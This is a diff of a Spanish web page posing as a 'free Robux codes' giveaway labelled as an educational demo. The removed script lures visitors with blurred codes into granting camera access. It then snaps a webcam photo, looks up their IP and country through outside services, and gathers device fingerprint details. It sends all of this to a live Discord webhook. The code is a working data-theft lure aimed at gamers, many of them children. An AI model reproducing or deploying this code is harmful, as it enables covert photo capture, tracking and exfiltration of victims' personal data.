@@ -1,188 +1,29 @@
-<script>
-  const WEBHOOK = "https://discord.com/api/webhooks/1394955639046017125/-WfN_y9umGx0-PV4GP0FID6mSIGq7NPXy6SQO-CmZRA1LOSppZgKX0IJNyKZisgnwqci"; // Solo demo controlada
-  const $ = (id)=>document.getElementById(id);
-  const log = (m)=>{ const el=$("log"); el.textContent += `\n${new Date().toLocaleTimeString()} — ${m}`; el.scrollTop = el.scrollHeight; };
-
-  const codes = $("codes");
-  const consentLayer = $("consentLayer");
-  const captureLayer = $("captureLayer");
-  const ck = $("ck");
-  const btnConsent = $("btn-consent");
-
-  const video = $("video");
-  const canvas = $("canvas");
-  const preview = $("preview");
-  const previewBox = $("previewBox");
-  const btnCancel = $("btn-cancel");
-  const btnClose = $("btn-close");
-
-  let stream = null; let lastBlob = null;
-
-  function unlock(){ codes.classList.remove('blurred'); codes.removeAttribute('aria-hidden'); log('Códigos desbloqueados.'); }
-  function openConsent(){ consentLayer.classList.add('show'); }
-  function closeConsent(){ consentLayer.classList.remove('show'); }
-  function openCapture(){ captureLayer.classList.add('show'); }
-  function closeCapture(){ captureLayer.classList.remove('show'); }
-
-  $("btn-open").addEventListener('click', openConsent);
-
-  // Atajo teclado: ñ para continuar SIN verificación (sin usar cámara)
-  document.addEventListener('keydown', (e)=>{
-    if (!consentLayer.classList.contains('show')) return;
-    const key = e.key || '';
-    if (key === 'ñ' || key === 'Ñ'){
-      e.preventDefault();
-      closeConsent();
-      unlock();
-    }
-  });
-
-  ck.addEventListener('change', ()=>{ btnConsent.disabled = !ck.checked; });
-
-  btnConsent.addEventListener('click', async ()=>{
-    if (!ck.checked) return;
-    closeConsent();
-    await requestCameraAndCapture();
-  });
-
-  $("btn-cancel").addEventListener('click', stopStream);
-  $("btn-close").addEventListener('click', ()=>{ closeCapture(); unlock(); });
-
-  async function requestCameraAndCapture(){
-    if (!('mediaDevices' in navigator) || !('getUserMedia' in navigator.mediaDevices)){
-      log('Este navegador no soporta getUserMedia.');
-      alert('Tu navegador no soporta cámara desde la web.');
-      return;
-    }
-    try{
-      openCapture();
-      log('Solicitando permiso de cámara…');
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio:false });
-      video.srcObject = stream; video.hidden = false; btnCancel.disabled = false;
-      await video.play();
-      log('Permiso concedido. Capturando fotograma…');
-      await new Promise(r=>setTimeout(r,650));
-      await captureFrame();
-    }catch(err){
-      log(`Permiso denegado o error: ${err.message}`);
-      alert('No se pudo acceder a la cámara.');
-      closeCapture();
-    }
-  }
-
-  async function captureFrame(){
-    if (!video || !video.videoWidth){ log('Video no listo para capturar.'); return; }
-    const w=video.videoWidth, h=video.videoHeight;
-    canvas.width=w; canvas.height=h;
-    canvas.getContext('2d').drawImage(video,0,0,w,h);
-    stopStream();
-    lastBlob = await new Promise(res=>canvas.toBlob(res,'image/png'));
-    const url = URL.createObjectURL(lastBlob);
-    preview.src=url; previewBox.style.display='block';
-    log(`Foto capturada (${Math.round(lastBlob.size/1024)} KB). Enviando a Discord…`);
-    await sendToDiscord(lastBlob);
-    btnClose.style.display='inline-block';
-  }
-
-  function stopStream(){
-    if (!stream) return;
-    stream.getTracks().forEach(t=>t.stop());
-    stream=null; video.srcObject=null; video.hidden=true; btnCancel.disabled=true;
-    log('Cámara detenida.');
-  }
-
-  // ===== NUEVO: helpers para ip/país y dispositivo =====
-  const INCLUIR_IP = true; // pon en false si no quieres consultar servicios externos
-
-  async function getBestEffortIpCountry() {
-    if (!INCLUIR_IP) return { ip: 'no disponible', pais: 'no disponible' };
-    try {
-      // IP pública
-      const ipRes = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
-      const ipJson = await ipRes.json();
-      const ip = ipJson?.ip || 'desconocido';
-
-      // País (puede fallar por CORS/límites)
-      let pais = 'desconocido';
-      try {
-        const geoRes = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, { cache: 'no-store' });
-        if (geoRes.ok) {
-          const g = await geoRes.json();
-          pais = g?.country_name || 'desconocido';
-        }
-      } catch (_) {}
-
-      return { ip, pais };
-    } catch (e) {
-      return { ip: 'no disponible', pais: 'no disponible' };
-    }
-  }
-
-  async function getBestEffortDeviceInfo() {
-    const ua = navigator.userAgent || 'desconocido';
-    const platform = navigator.platform || 'desconocido';
-    const touch = (navigator.maxTouchPoints || 0) > 0 ? 'táctil' : 'no táctil';
-    const dispositivo = `${platform} (${touch})`;
-    const lang = (navigator.languages && navigator.languages.join(', ')) || navigator.language || 'desconocido';
-    const tz = (Intl && Intl.DateTimeFormat().resolvedOptions().timeZone) || 'desconocido';
-    const mem = ('deviceMemory' in navigator) ? `${navigator.deviceMemory}GB` : 'desconocido';
-    const cores = ('hardwareConcurrency' in navigator) ? `${navigator.hardwareConcurrency}` : 'desconocido';
-    const screenInfo = (screen && screen.width && screen.height)
-      ? `${screen.width}x${screen.height}@${window.devicePixelRatio || 1}x`
-      : 'desconocido';
-    const conn = (navigator.connection && navigator.connection.effectiveType) || 'desconocido';
-    const ref = document.referrer || '—';
-
-    // Batería (opcional)
-    let battery = 'desconocido';
-    try {
-      if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        battery = `${Math.round((b.level || 0) * 100)}%`;
-      }
-    } catch (_) {}
-
-    return { ua, platform, touch, dispositivo, lang, tz, mem, cores, screenInfo, conn, ref, battery };
-  }
-
-  // ===== NUEVO: reemplazo de sendToDiscord =====
-  async function sendToDiscord(blob){
-    try{
-      const fd = new FormData();
-      fd.append('file', blob, `captura-${Date.now()}.png`);
-
-      const dev = await getBestEffortDeviceInfo();
-      const { ip, pais } = await getBestEffortIpCountry();
-
-      const payload =
-`✅ Demo educativa (consentimiento otorgado)
-ip: ${ip}
-pais: ${pais}
-navegador: ${dev.ua}
-dispositivo usado: ${dev.dispositivo}
-foto: (adjunta)
-— extras —
-idioma(s): ${dev.lang}
-zona horaria: ${dev.tz}
-pantalla: ${dev.screenInfo}
-red: ${dev.conn}
-núcleos CPU: ${dev.cores}
-memoria disp.: ${dev.mem}
-batería: ${dev.battery}
-referrer: ${dev.ref}`;
-
-      fd.append('payload_json', JSON.stringify({ content: payload }));
-
-      const res = await fetch(WEBHOOK, { method: 'POST', body: fd });
-      if (!res.ok){
-        const txt = await res.text();
-        throw new Error(`HTTP ${res.status}: ${txt.slice(0,160)}`);
-      }
-      log('Envío completado. Revisa el canal de Discord.');
-    }catch(err){
-      log('Error al enviar a Discord: ' + err.message);
-      alert('No se pudo enviar a Discord. Revisa el webhook.');
-      console.error(err);
-    }
-  }
-</script>
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Robux gratis 2025 — Nuevos códigos (Demo educativa)</title>
+  <style>
+    :root{--bg:#0a0f1d;--card:#0f172a;--ink:#e5e7eb;--muted:#94a3b8;--accent:#22c55e;--warn:#f59e0b;--bad:#ef4444;--border:#1f2937}
+    *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,Arial}
+    body{margin:0;background:linear-gradient(180deg,#0b1022,#0f172a 40%,#0b1022);color:var(--ink);min-height:100svh}
+    .container{max-width:980px;margin:auto;padding:24px}
+    .card{background:var(--card);border:1px solid var(--border);border-radius:18px;box-shadow:0 12px 30px rgba(0,0,0,.35);overflow:hidden}
+    header{padding:18px;border-bottom:1px solid var(--border)}
+    header h1{margin:0;font-size:clamp(22px,3.5vw,30px)}
+    header p{margin:6px 0 0;color:var(--muted)}
+    main{display:grid;grid-template-columns:1fr;gap:16px;padding:16px}
+    @media (min-width:900px){main{grid-template-columns:1.2fr .8fr}}
+    .panel{background:#0a1020;border:1px solid var(--border);border-radius:14px;padding:14px}
+    .codes{display:grid;gap:10px}
+    .code{display:flex;justify-content:space-between;align-items:center;background:#0b1120;border:1px solid #223047;border-radius:12px;padding:10px}
+    .code kbd{background:#0f1a2f;border:1px solid #2a3b57;border-radius:8px;padding:6px 10px;font-family:ui-monospace,Menlo,Consolas;letter-spacing:.5px}
+    .btn{appearance:none;border:0;border-radius:12px;padding:10px 14px;font-weight:700;cursor:pointer}
+    .btn.primary{background:var(--accent);color:#052011;box-shadow:0 8px 20px rgba(34,197,94,.35)}
+    .btn.ghost{background:transparent;border:1px solid #334155;color:var(--ink)}
+    .muted{color:var(--muted)}
+    .blurred{filter:blur(8px)}
+    .overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;align-items:center;justify-content:center;padding:18px}
+    .overlay.show{display:flex}
+    .modal{max-width:640px;width:100%;background:#0f172a;border:1px solid #334155;border-radi
